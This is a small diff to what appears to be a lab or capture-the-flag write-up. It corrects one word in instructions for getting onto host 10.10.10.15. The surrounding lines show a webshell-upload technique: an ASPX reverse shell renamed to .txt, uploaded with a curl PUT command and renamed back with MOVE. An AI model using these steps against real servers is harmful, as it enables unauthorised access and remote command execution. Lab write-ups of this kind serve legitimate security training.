@@ -64,7 +64,7 @@ mv shell.aspx shell.txt
 + `/usr/share/webshells/aspx/cmdasp.aspx`
 + https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
 
-Upload it using curl with PUT method, and rename it back to the original file type aspx using curl with MOVE option:
+Upload it using curl with PUT method, and rename it back to the original file type aspx using curl with MOVE method:
 
 ```
 curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt
